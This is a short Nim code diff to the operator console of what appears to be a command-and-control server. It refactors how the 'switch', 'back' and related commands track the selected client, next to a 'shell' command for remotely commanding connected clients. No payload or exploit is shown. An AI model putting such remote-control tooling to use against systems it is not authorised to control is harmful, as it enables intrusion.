@@ -6,7 +6,6 @@ import listeners/[tcp]
 import types, logging
 
 proc procStdin*(server: C2Server) {.async.} =
-  var handlingClientId: int = -1
   var handlingClient: Client
 
   prompt(handlingClient, server)
@@ -42,10 +41,9 @@ proc procStdin*(server: C2Server) {.async.} =
         of "switch":
             for client in server.clients:
                 if client.id == parseInt(args[1]):
-                    handlingClientId = parseInt(args[1])
                     handlingClient = client
-                if handlingClientId != parseInt(args[1]):
-                    infoLog "client not found"
+            if handlingClient.id != parseInt(args[1]):
+                infoLog "client not found"
         of "info":
             echo @handlingClient
         of "shell":
@@ -63,7 +61,7 @@ proc procStdin*(server: C2Server) {.async.} =
                     server.clRespFuture[] = newFuture[void]()
                 await server.clRespFuture[]
         of "back": 
-            handlingClientId = -1
+            handlingClient = nil
         of "exit":
             quit(0)
 
